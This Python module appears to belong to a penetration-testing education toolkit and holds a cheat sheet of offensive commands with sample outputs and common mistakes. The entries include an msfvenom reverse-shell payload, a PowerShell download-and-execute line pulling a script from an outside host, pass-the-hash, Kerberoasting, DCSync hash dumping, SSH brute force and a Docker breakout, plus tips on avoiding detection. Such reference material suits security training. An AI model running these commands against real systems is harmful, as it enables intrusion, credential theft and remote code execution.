#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║        ERR0RS ULTIMATE — CHEAT SHEETS                            ║
║              src/education_new/cheatsheets.py                     ║
║                                                                  ║
║  One command · one purpose · one example · one output · one      ║
║  mistake to avoid. The fast-reference layer that complements     ║
║  the deep teach lessons and the command-anatomy breakdowns.      ║
║                                                                  ║
║  Every entry is real and runnable — no filler. Extend CHEATS     ║
║  toward the long tail without touching the accessors/UI.         ║
║  For a token-by-token breakdown of any example, pipe it through  ║
║  command_anatomy (the `anatomy <command>` CLI verb).             ║
║                                                                  ║
║  Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone        ║
╚══════════════════════════════════════════════════════════════════╝
"""

from __future__ import annotations

from typing import Dict, List, Optional

# Each: cat, cmd, purpose, ex(ample), out(put), mistake.
CHEATS: List[Dict] = [
    {"cat": "Nmap", "cmd": "nmap -sC -sV -oA scan <ip>", "purpose": "Default-script + version scan, saved in all 3 formats.",
     "ex": "nmap -sC -sV -p- --min-rate 2000 -oA full 10.0.0.5",
     "out": "445/tcp open microsoft-ds | 3389/tcp open ms-wbt-server",
     "mistake": "Forgetting -p- — you scan only the top 1000 ports and miss the box on 8443."},
    {"cat": "Nmap", "cmd": "nmap -sn <cidr>", "purpose": "Ping-sweep a subnet for live hosts (no port scan).",
     "ex": "nmap -sn 10.0.0.0/24", "out": "Host: 10.0.0.10 Status: Up",
     "mistake": "Trusting it where ICMP is blocked — hosts look down but are alive. Add -Pn."},
    {"cat": "NetExec", "cmd": "nxc smb <ip> -u <user> -p <pass>", "purpose": "Authenticate to SMB and fingerprint host/domain.",
     "ex": "nxc smb 10.0.0.0/24 -u jdoe -p Pass123 --shares", "out": "SMB 10.0.0.15 [+] corp\\jdoe (Pwn3d!)",
     "mistake": "Spraying a whole subnet with a domain account and locking it out — read the lockout policy first."},
    {"cat": "NetExec", "cmd": "nxc smb <ip> -u <user> -H <nthash>", "purpose": "Pass-the-Hash — auth with the NT hash, no password.",
     "ex": "nxc smb 10.0.0.15 -u administrator -H 9f4e..b7 --local-auth", "out": "SMB 10.0.0.15 [+] administrator (Pwn3d!)",
     "mistake": "Passing LM:NT when only NT is needed, or omitting --local-auth for local accounts."},
    {"cat": "Metasploit", "cmd": "msfconsole -q -x \"<cmds>\"", "purpose": "Launch and run console commands immediately.",
     "ex": "msfconsole -q -x 'use multi/handler; set LHOST tun0; run'", "out": "[*] Started reverse handler on tun0:4444",
     "mistake": "Leaving default LPORT 4444 in a real engagement — trivially fingerprinted."},
    {"cat": "Metasploit", "cmd": "msfvenom -p <payload> LHOST= -f <fmt>", "purpose": "Generate a standalone payload.",
     "ex": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o s.exe", "out": "Payload size: 712 bytes | Saved as: s.exe",
     "mistake": "Using reverse_tcp on a monitored network when reverse_https blends into HTTPS egress."},
    {"cat": "Hashcat", "cmd": "hashcat -m <mode> hash.txt <wordlist>", "purpose": "GPU-crack a hash by mode number.",
     "ex": "hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule", "out": "$krb5asrep$23$user@CORP...:Autumn2025!",
     "mistake": "Wrong -m mode. 18200=AS-REP, 13100=Kerberoast, 1000=NTLM, 5600=NetNTLMv2 — mixing them = 0 cracks."},
    {"cat": "Hydra", "cmd": "hydra -l <user> -P <list> <proto>://<ip>", "purpose": "Online brute-force a login service.",
     "ex": "hydra -l admin -P rockyou.txt ssh://10.0.0.5 -t 4", "out": "[22][ssh] host: 10.0.0.5 login: admin password: hunter2",
     "mistake": "-t 64 against SSH — you trip rate-limits/fail2ban and lock yourself out. Keep threads low."},
    {"cat": "Kerberos", "cmd": "impacket-GetNPUsers <dom>/ -usersfile u", "purpose": "AS-REP roast preauth-disabled accounts (no creds).",
     "ex": "impacket-GetNPUsers corp.local/ -usersfile u.txt -no-pass -dc-ip 10.0.0.10", "out": "$krb5asrep$23$svc_backup@CORP...",
     "mistake": "Running without -no-pass, or forgetting -dc-ip and hitting DNS resolution errors."},
    {"cat": "Kerberos", "cmd": "impacket-GetUserSPNs <dom>/u:p -request", "purpose": "Kerberoast — request tickets for SPN accounts.",
     "ex": "impacket-GetUserSPNs corp.local/jdoe:Pass123 -dc-ip 10.0.0.10 -request", "out": "$krb5tgs$23$*svc_sql*...",
     "mistake": "Needs valid domain creds (unlike AS-REP); forgetting -request only lists, doesn't roast."},
    {"cat": "LDAP", "cmd": "ldapsearch -x -H ldap://<ip> -b <basedn>", "purpose": "Query the directory, optionally anonymously.",
     "ex": "ldapsearch -x -H ldap://10.0.0.10 -b 'DC=corp,DC=local' '(objectClass=user)'", "out": "sAMAccountName: jdoe | description: temp pw Welcome1",
     "mistake": "Not checking description/info fields — admins hide passwords there constantly."},
    {"cat": "AD", "cmd": "bloodhound-python -u u -p p -d <dom> -c All", "purpose": "Collect AD relationships for path analysis.",
     "ex": "bloodhound-python -u jdoe -p Pass123 -d corp.local -ns 10.0.0.10 -c All", "out": "INFO: Found 412 users, 88 groups → .zip",
     "mistake": "Forgetting -ns (nameserver) — collection fails on DNS in isolated labs."},
    {"cat": "AD", "cmd": "impacket-secretsdump <dom>/u:p@<dc> -just-dc", "purpose": "DCSync — pull domain hashes (needs DA/repl rights).",
     "ex": "impacket-secretsdump corp.local/da:pw@10.0.0.10 -just-dc-user krbtgt", "out": "krbtgt:502:aad3b...:9f4e...:::",
     "mistake": "DCSyncing loudly (4662 replication alert) when you only needed one account — target -just-dc-user."},
    {"cat": "SQLMap", "cmd": "sqlmap -u \"<url>?id=1\" --batch", "purpose": "Automated SQL-injection detection & exploitation.",
     "ex": "sqlmap -u 'http://site/p?id=1' --batch --dbs --risk=2 --level=3", "out": "available databases [3]: information_schema, app, users",
     "mistake": "Blasting --risk=3 --level=5 at production — slow and destructive. Escalate gradually."},
    {"cat": "SQLMap", "cmd": "sqlmap -r req.txt --batch", "purpose": "Test injection from a saved Burp request (POST/headers).",
     "ex": "sqlmap -r login.req --batch --dump -T users", "out": "Table: users | 3 entries dumped",
     "mistake": "Retyping complex POST params by hand instead of saving the Burp request to a file."},
    {"cat": "Wireshark", "cmd": "<display filter>", "purpose": "Isolate protocols/hosts in a capture.",
     "ex": "ip.addr==10.0.0.5 && tcp.port==445", "out": "Filters 40k packets to the SMB conversation you care about.",
     "mistake": "Confusing capture filters (BPF) with display filters (Wireshark syntax) — different languages."},
    {"cat": "PowerShell", "cmd": "IEX(New-Object Net.WebClient).DownloadString(<url>)", "purpose": "Download & execute a script in memory (no disk).",
     "ex": "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')", "out": "Script runs in-session, nothing written to disk.",
     "mistake": "Assuming it's invisible — AMSI + Script Block Logging (4104) catch it. Modern EDR sees this."},
    {"cat": "Linux", "cmd": "find / -perm -4000 2>/dev/null", "purpose": "Find SUID binaries — a top local-privesc vector.",
     "ex": "find / -perm -4000 -type f 2>/dev/null", "out": "/usr/bin/pkexec  /usr/bin/find",
     "mistake": "Seeing SUID find/vim and not realizing they're instant root via GTFOBins."},
    {"cat": "Linux", "cmd": "sudo -l", "purpose": "List what the current user may run as sudo.",
     "ex": "sudo -l", "out": "(root) NOPASSWD: /usr/bin/vim",
     "mistake": "Overlooking it — one NOPASSWD entry on a GTFOBins binary is game over. Run it first."},
    {"cat": "Windows", "cmd": "whoami /priv", "purpose": "List the current token's privileges (privesc hunting).",
     "ex": "whoami /priv", "out": "SeImpersonatePrivilege  Enabled",
     "mistake": "Missing SeImpersonate — it enables Potato attacks to SYSTEM. Check it first on Windows."},
    {"cat": "Docker", "cmd": "docker run -v /:/host -it <img>", "purpose": "Mount the host filesystem into a container (breakout).",
     "ex": "docker run -v /:/mnt -it alpine chroot /mnt sh", "out": "Full root access to the host filesystem.",
     "mistake": "Assuming containers are a security boundary — a mountable Docker socket = host root."},
    {"cat": "Kubernetes", "cmd": "kubectl auth can-i --list", "purpose": "Enumerate your RBAC permissions in the cluster.",
     "ex": "kubectl auth can-i --list --as=system:serviceaccount:default:default", "out": "pods [get,list,create]  secrets [get]",
     "mistake": "Not checking create-pod rights — that alone often lets you mount the host and escape."},
]

_CATS = []
for _c in CHEATS:
    if _c["cat"] not in _CATS:
        _CATS.append(_c["cat"])


def list_categories() -> List[str]:
    """Distinct categories in declaration order."""
    return list(_CATS)


def get_cheats(category: Optional[str] = None) -> List[Dict]:
    """All cheats, or just those in a category (case-insensitive)."""
    if not category:
        return list(CHEATS)
    cat = category.strip().lower()
    return [c for c in CHEATS if c["cat"].lower() == cat]


def search_cheats(query: str) -> List[Dict]:
    """Substring match across command/purpose/example/category/mistake."""
    q = (query or "").strip().lower()
    if not q:
        return list(CHEATS)
    return [c for c in CHEATS
            if q in (c["cmd"] + c["purpose"] + c["ex"] + c["cat"] + c["mistake"]).lower()]


def format_cheats(items: List[Dict]) -> str:
    """Render a list of cheats as terminal blocks."""
    if not items:
        return "  No matching cheat-sheet entries."
    bar = "═" * 60
    out = [bar, f"  📇 CHEAT SHEET  ({len(items)} entr{'y' if len(items)==1 else 'ies'})", bar]
    for c in items:
        out.append(f"  ▸ {c['cmd']}   [{c['cat']}]")
        out.append(f"      purpose : {c['purpose']}")
        out.append(f"      example : {c['ex']}")
        out.append(f"      output  : {c['out']}")
        out.append(f"      ⚠ avoid : {c['mistake']}")
        out.append("")
    out.append("  Tip: `anatomy <example>` breaks any command down part-by-part.")
    out.append(bar)
    return "\n".join(out)
